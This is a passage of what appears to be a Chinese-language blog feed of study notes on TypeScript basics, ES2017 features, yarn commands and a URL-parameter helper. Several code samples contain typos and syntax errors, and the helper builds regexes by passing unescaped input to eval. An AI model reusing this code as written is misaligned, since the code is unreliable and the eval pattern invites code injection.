class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo: object = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125; <span class="comment">// [] // &#123;&#125;</span></span><br><span class="line"><span class="comment">// object类型不止有对象，还有数组，函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj: &#123; foo: <span class="built_in">number</span> &#125; = &#123; foo:<span class="number">123</span> &#125; <span class="comment">// 对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组类型</span></span><br><span class="line"><span class="keyword">const</span> arr1: <span class="built_in">Array</span>&lt;<span class="built_in">number</span>&gt; = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="keyword">const</span> arr2: <span class="built_in">number</span>[] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span> (<span class="params">...args: <span class="built_in">number</span>[]</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 就不用在这里判断是否数字了</span></span><br><span class="line">    <span class="keyword">return</span> args.reduce(<span class="function">(<span class="params">prev, current</span>) =&gt;</span> pre + current, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 元组类型:数量和类型确定</span></span><br><span class="line"><span class="keyword">const</span> tuple: [<span class="built_in">number</span>, <span class="built_in">string</span>] = [<span class="number">18</span>, <span class="string">'a'</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.entries() <span class="comment">//得到的就是元组</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 枚举类型</span></span><br><span class="line"><span class="keyword">const</span> post = &#123;</span><br><span class="line">    title: <span class="string">'aaaaa'</span></span><br><span class="line">    content: <span class="string">'abbb'</span>,</span><br><span class="line">    status: <span class="number">0</span> <span class="comment">// 0,1,2 代表不同状态，如果忘了或者混进其他数字怎么办</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加上const不会影响编译后的代码</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">enum</span> PostStatus &#123;</span><br><span class="line">    Draft = <span class="number">0</span>,</span><br><span class="line">    Unpublished = <span class="number">1</span>,</span><br><span class="line">    Published = <span class="number">2</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 令status = PostStatus.Draft</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func1</span> (<span class="params">a: <span class="built_in">number</span>, b?:<span class="built_in">number</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'func1'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 函数表达式</span></span><br><span class="line"><span class="keyword">const</span> func2: <span class="function">(<span class="params">a: <span class="built_in">number</span>, b:<span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">string</span> = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'func2'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任意类型</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stringify</span> (<span class="params">value: <span class="built_in">any</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(value)</span><br><span class="line">&#125;</span><br><span class="line">stringify(<span class="string">'str'</span>) <span class="comment">// 轻易不要使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 隐式类型推断</span></span><br><span class="line"><span class="keyword">let</span> age = <span class="number">18</span> <span class="comment">// number</span></span><br><span class="line">age = <span class="string">'string'</span> <span class="comment">// 保存</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo <span class="comment">// 默认为any</span></span><br><span class="line">foo = <span class="string">'string</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 类型断言</span></span><br><span class="line"><span class="string">const nums = [110, 120, 119, 112]</span></span><br><span class="line"><span class="string">const res = nums.find(i =&gt; i &gt; 0)</span></span><br><span class="line"><span class="string">const square = res * res // ts会报错，它认为res为number或undefined（可能找不到）</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 如何断言</span></span><br><span class="line"><span class="string">const num1 = res as number</span></span><br><span class="line"><span class="string">const num2 = &lt;number&gt;res // JSX 下不能使用</span></span><br></pre></td></tr></table></figure><h2 id="TypeScript接口与类"><a href="#TypeScript接口与类" class="headerlink" title="TypeScript接口与类"></a>TypeScript接口与类</h2><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 接口</span></span><br><span class="line"><span class="keyword">interface</span> Post &#123;</span><br><span class="line">    title: <span class="built_in">string</span></span><br><span class="line">    content: <span class="built_in">string</span></span><br><span class="line">    subtitle?: <span class="built_in">string</span>        <span class="comment">// 可选成员</span></span><br><span class="line">    readonly summary: <span class="built_in">string</span> <span class="comment">// 只读成员</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printPost</span> (<span class="params">post: Post</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(post.title)</span><br><span class="line">    <span class="built_in">console</span>.log(post.content)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printPost(&#123;</span><br><span class="line">    title: <span class="string">'hello'</span>,</span><br><span class="line">    content: <span class="string">'a'</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动态成员</span></span><br><span class="line"><span class="keyword">interface</span> Cache &#123;</span><br><span class="line">    [prop: <span class="built_in">string</span>]: <span class="built_in">string</span> <span class="comment">// 属性名为任意字符串</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> cache: Cache = &#123;&#125;</span><br><span class="line">cache.foo = <span class="string">'value1'</span></span><br><span class="line">cache.bar = <span class="string">'value2'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 类</span></span><br><span class="line"><span class="keyword">class</span> Person &#123;</span><br><span class="line">    <span class="keyword">public</span> name: <span class="built_in">string</span></span><br><span class="line">    <span class="keyword">private</span> age: <span class="built_in">number</span></span><br><span class="line">    <span class="keyword">protected</span> readonly gender: <span class="built_in">boolean</span> <span class="comment">// protected只允许子类访问   readonly只读属性</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span> (<span class="params">name: <span class="built_in">string</span>, age: <span class="built_in">number</span></span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name</span><br><span class="line">        <span class="keyword">this</span>.age = age</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    sayHi (msg: <span class="built_in">string</span>)：<span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name, msg)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Student <span class="keyword">extends</span> Person &#123;</span><br><span class="line">    <span class="keyword">constructor</span> (<span class="params">name: <span class="built_in">string</span>, age: <span class="built_in">number</span></span>) &#123;</span><br><span class="line"><span class="keyword">super</span>(name, age)</span><br><span class="line">         <span class="built_in">console</span>.log(<span class="keyword">this</span>,gender)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> tom = <span class="keyword">new</span> Person(<span class="string">'tom'</span>, <span class="number">18</span>)</span><br><span class="line"> <span class="built_in">console</span>.log(<span class="keyword">this</span>.gender) <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><p>类去实现接口</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Eat &#123;</span><br><span class="line">    eat（food: <span class="built_in">string</span>): <span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> Run &#123;</span><br><span class="line">    run（distance: <span class="built_in">number</span>): <span class="built_in">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Person <span class="keyword">implements</span> Eat, Run &#123;</span><br><span class="line">    eat (food: <span class="built_in">string</span>): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`优雅地进餐：<span class="subst">$&#123;food&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    run (distance: <span class="built_in">number</span>): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`直立行走：<span class="subst">$&#123;distance&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Animal <span class="keyword">implements</span> Eat, Run &#123;</span><br><span class="line">    eat (food: <span class="built_in">string</span>): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`呼噜呼噜地吃：<span class="subst">$&#123;food&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    run (distance: <span class="built_in">number</span>): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`爬行：<span class="subst">$&#123;distance&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抽象类：与接口的区别是可以包含具体的实现</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> Animal &#123; <span class="comment">// 抽象类只能被继承</span></span><br><span class="line">    eat (food: <span class="built_in">string</span>): <span class="built_in">void</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`呼噜呼噜地吃：<span class="subst">$&#123;food&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">abstract</span> run (distance: <span class="built_in">number</span>): <span class="built_in">void</span> <span class="comment">// 抽象方法在子类中必须实现</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Dog <span class="keyword">extends</span> Animal &#123;</span><br><span class="line">    run (distance: <span class="built_in">number</span>): <span class="built_in">void</span> &#123; </span><br><span class="line">         <span class="built_in">console</span>.log(<span class="string">`爬行：<span class="subst">$&#123;distance&#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> d = <span class="keyword">new</span> Dog()</span><br><span class="line">d.eat(<span class="string">'food'</span>)</span><br><span class="line">d.run(<span class="number">100</span>)</span><br></pre></td></tr></table></figure><h2 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h2><p>声明时不指定类型，调用时才指定</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createNumberArray</span> (<span class="params">length: <span class="built_in">number</span>, value: <span class="built_in">number</span></span>): <span class="title">number</span>[] </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> arr = <span class="built_in">Array</span>&lt;<span class="built_in">number</span>&gt;(length).fill(value)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createStringArray</span> (<span class="params">length: <span class="built_in">number</span>, value: <span class="built_in">string</span></span>): <span class="title">string</span>[] </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> arr = <span class="built_in">Array</span>&lt;<span class="built_in">string</span>&gt;(length).fill(value)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泛型解决冗余问题,在函数后面加&lt;T&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createArray</span>&lt;<span class="title">T</span>&gt; (<span class="params">length: <span class="built_in">number</span>, value: T</span>): <span class="title">T</span>[] </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> arr = <span class="built_in">Array</span>&lt;T&gt;(length).fill(value)</span><br><span class="line">    <span class="keyword">return</span> arr</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> res = createArray&lt;<span class="built_in">string</span>&gt;(<span class="number">3</span>, <span class="string">'foo'</span>)</span><br></pre></td></tr></table></figure><p>类型声明：引入第三方模块时没有类型则需要声明</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; camelCase &#125; <span class="keyword">from</span> <span class="string">'lodash'</span></span><br><span class="line"><span class="keyword">declare</span> <span class="function"><span class="keyword">function</span> <span class="title">camelCase</span> (<span class="params">input: <span class="built_in">string</span></span>): <span class="title">string</span></span></span><br><span class="line">const res = camelCase('hello typed')</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或者在npm模块中直接安装 类型声明</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> TypeScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-8.22</title>
      <link href="2020/08/22/%E6%97%A5%E5%B8%B8-2020.8.22/"/>
      <url>2020/08/22/%E6%97%A5%E5%B8%B8-2020.8.22/</url>
      
        <content type="html"><![CDATA[<ul><li>ES 2017</li><li>yarn：另一种包管理工具</li><li>清除命令行：cls</li><li>内存</li><li>浏览器：disabled cache</li><li>函数封装：修改url参数</li></ul><a id="more"></a><h2 id="ES-2017"><a href="#ES-2017" class="headerlink" title="ES 2017"></a>ES 2017</h2><ul><li>Object.values</li><li>Object.entries</li><li>Object.getOwnPropertyDescriptors</li><li>String.prototype.padStart</li><li>Sting.prototype.padEnd</li><li>函数参数中添加尾逗号</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">    foo: <span class="string">'value1'</span>,</span><br><span class="line">    bar: <span class="string">'value2'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.keys(obj))   <span class="comment">// 键</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.values(obj)) <span class="comment">// 值</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.entries(obj))</span><br><span class="line"><span class="comment">// [["foo", "value1"], ["bar", "value2"]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以用这种方法来遍历对象</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> [key, value] <span class="keyword">of</span> <span class="built_in">Object</span>.entries(obj)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(key, value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象转换为Map</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Map</span>(<span class="built_in">Object</span>.entries(obj))</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.getOwnPropertyDescriptors(obj)</span><br><span class="line"><span class="comment">// 获取对象的完整描述信息</span></span><br><span class="line"><span class="comment">// &#123;foo: &#123;…&#125;, bar: &#123;…&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// foo:</span></span><br><span class="line"><span class="comment">// value: "value1"</span></span><br><span class="line"><span class="comment">// writable: true</span></span><br><span class="line"><span class="comment">// enumerable: true</span></span><br><span class="line"><span class="comment">// configurable: true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bar:</span></span><br><span class="line"><span class="comment">// value: "value2"</span></span><br><span class="line"><span class="comment">// writable: true</span></span><br><span class="line"><span class="comment">// enumerable: true</span></span><br><span class="line"><span class="comment">// configurable: true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//padEnd和padStart可以使输出更工整</span></span><br><span class="line"><span class="keyword">const</span> books = &#123;</span><br><span class="line">    html: <span class="number">5</span>,</span><br><span class="line">    css: <span class="number">16</span>,</span><br><span class="line">    javascript: <span class="number">128</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">const</span> [name, count] <span class="keyword">of</span> <span class="built_in">Object</span>.entries(books)) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;name.padEnd(<span class="number">16</span>, <span class="string">'-'</span>)&#125;</span>|<span class="subst">$&#123;count.toString().padStart(<span class="number">3</span>, <span class="string">'0'</span>)&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// html------------|005</span></span><br><span class="line"><span class="comment">// css-------------|016</span></span><br><span class="line"><span class="comment">// javascript------|128</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 尾逗号，方便代码管理</span></span><br><span class="line"><span class="keyword">const</span> arr = [</span><br><span class="line">    <span class="number">100</span>,</span><br><span class="line">    <span class="number">200</span>,</span><br><span class="line">    <span class="number">300</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="yarn：另一种包管理工具"><a href="#yarn：另一种包管理工具" class="headerlink" title="yarn：另一种包管理工具"></a>yarn：另一种包管理工具</h2><p>FaceBook 开源的一个新的包管理器， 和npm的作用是一样的，但是解决了一些npm的痛点。</p><p>安装：<code>npm install -g yarn</code></p><h3 id="yarn的常用命令"><a href="#yarn的常用命令" class="headerlink" title="yarn的常用命令"></a>yarn的常用命令</h3><table><thead><tr><th>npm</th><th>yarn</th></tr></thead><tbody><tr><td>npm init</td><td>yarn init</td></tr><tr><td>npm install</td><td>yarn install</td></tr><tr><td>npm install –no-package-lock</td><td>yarn install –no-package-lock</td></tr><tr><td>npm install xxx –save</td><td>yarn add xxx</td></tr><tr><td>npm install xxx –save-dev</td><td>yarn add xxx –dev</td></tr><tr><td>npm uninstall xxx –save</td><td>yarn remove xxx</td></tr><tr><td>yarn add xx@version</td><td>npm install xx@vision</td></tr><tr><td>yarn upgrade xx</td><td>npm update xx</td></tr><tr><td>yarn upgrade xx@version</td><td>npm update xx@vision</td></tr><tr><td>yarn why xx</td><td>-</td></tr><tr><td>yarn config list</td><td>npm config list</td></tr></tbody></table><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>在程序运行的时候，整块内存可以划分为：</p><ul><li>常量池（存放基本类型的值）</li><li>栈（存放变量）</li><li>堆（存放对象）</li><li>运行时环境（函数运行时） </li></ul><h2 id="浏览器：disabled-cache"><a href="#浏览器：disabled-cache" class="headerlink" title="浏览器：disabled cache"></a>浏览器：disabled cache</h2><p>浏览器调试工具的disable cache功能，开启这个功能，浏览器关于当前网站的js、css、图片等缓存都会失效，所有请求都会重新发送给服务器。<code>ctrl</code>+<code>F5</code>也可以达到同样的效果。  </p><blockquote><p>当勾选Disable cache重新加载页面后，再取消勾选Disable cache重新加载页面，会发现浏览器立即就使用缓存了，由此可以证明我上面的结论：<strong>缓存一直都在，只不过就看浏览器想不想用了</strong>。 </p></blockquote><h2 id="函数封装：修改url参数"><a href="#函数封装：修改url参数" class="headerlink" title="函数封装：修改url参数"></a>函数封装：修改url参数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 函数功能：修改 url 中的某一个参数</span></span><br><span class="line"><span class="comment"> * 如果 url 中不存在该参数 arg，则添加参数 arg = newValue</span></span><br><span class="line"><span class="comment"> * 如果 newValue 为 undefine || '' 则删除该 arg</span></span><br><span class="line"><span class="comment"> * 存在 则将 url 中的 arg 的值改为 newValue</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 当newValue为空时：删除该 arg 参数，例如</span></span><br><span class="line"><span class="comment"> *   1. 匹配到?arg=value&amp; 删掉 arg=value&amp;</span></span><br><span class="line"><span class="comment"> *   2. 匹配到?arg=value  删掉 ?arg=value</span></span><br><span class="line"><span class="comment"> *   3. 匹配到&amp;arg=value&amp; 删掉 &amp;arg=value</span></span><br><span class="line"><span class="comment"> *   4. 匹配到&amp;arg=value  删掉 &amp;arg=value</span></span><br><span class="line"><span class="comment"> * 当newValue不为空时：</span></span><br><span class="line"><span class="comment"> *   1. url 里存在   arg =&gt; 替换</span></span><br><span class="line"><span class="comment"> *   2. url 里不存在 arg =&gt; 增加 :  (1)url 里原来有参数时，添加 $arg=newValue</span></span><br><span class="line"><span class="comment"> *                                 (2)url 里原来无参数时，添加 arg=newValue</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">                                                    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeURLArg</span> (<span class="params">url, arg, newValue</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> reg = <span class="string">`<span class="subst">$&#123;arg&#125;</span>=([^&amp;]*)`</span></span><br><span class="line">    <span class="keyword">const</span> reg1 = <span class="built_in">eval</span>(<span class="string">`/\\?<span class="subst">$&#123;reg&#125;</span>&amp;/g`</span>)    <span class="comment">// 匹配到?arg=value&amp;</span></span><br><span class="line">    <span class="keyword">const</span> reg2 = <span class="built_in">eval</span>(<span class="string">`/(\\?|&amp;)<span class="subst">$&#123;reg&#125;</span>/g`</span>) <span class="comment">// 匹配到?arg=value 或者 &amp;arg=value</span></span><br><span class="line">    <span class="keyword">const</span> reg3 = <span class="built_in">eval</span>(<span class="string">`/&amp;<span class="subst">$&#123;reg&#125;</span>&amp;/g`</span>)      <span class="comment">// 匹配到&amp;arg=value </span></span><br><span class="line">    <span class="keyword">if</span>(!newValue) &#123;</span><br><span class="line">        url = url.replace(reg1, <span class="string">'?'</span>).replace(reg2, <span class="string">``</span>).replace(reg3, <span class="string">`&amp;`</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(url.match(<span class="built_in">eval</span>(<span class="string">`/<span class="subst">$&#123;reg&#125;</span>/g`</span>))) &#123;</span><br><span class="line">            url = url.replace(<span class="built_in">eval</span>(<span class="string">`/<span class="subst">$&#123;reg&#125;</span>/g`</span>), <span class="string">`<span class="subst">$&#123;arg&#125;</span>=<span class="subst">$&#123;newValue&#125;</span>`</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            url += url.indexOf(<span class="string">'?'</span>) !== - <span class="number">1</span> ? <span class="string">`&amp;<span class="subst">$&#123;arg&#125;</span>=<span class="subst">$&#123;newValue&#125;</span>`</span> : <span class="string">`?<span class="subst">$&#123;arg&#125;</span>=<span class="subst">$&#123;newValue&#125;</span>`</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> url = <span class="string">"http://focus.cn?name=jin&amp;age=18"</span></span><br><span class="line"><span class="built_in">console</span>.log(changeURLArg(url, <span class="string">'name'</span>, <span class="string">'a'</span>))</span><br></pre></td></tr></table></figure><ul><li>为什么要用eval？：`/\?${reg}&amp;/g` 这种是字符串形式，用eval转换为正则表达式形式</li><li>？需要转义，如果用eval的话就需要用 \\</li><li>正常情况下只用一个 \    <code>&#39;123?&#39;.match(/\?/g)</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>函数式编程</title>
      <link href="2020/08/18/%E6%95%B4%E7%90%86-%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"/>
      <url>2020/08/18/%E6%95%B4%E7%90%86-%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/</url>
      
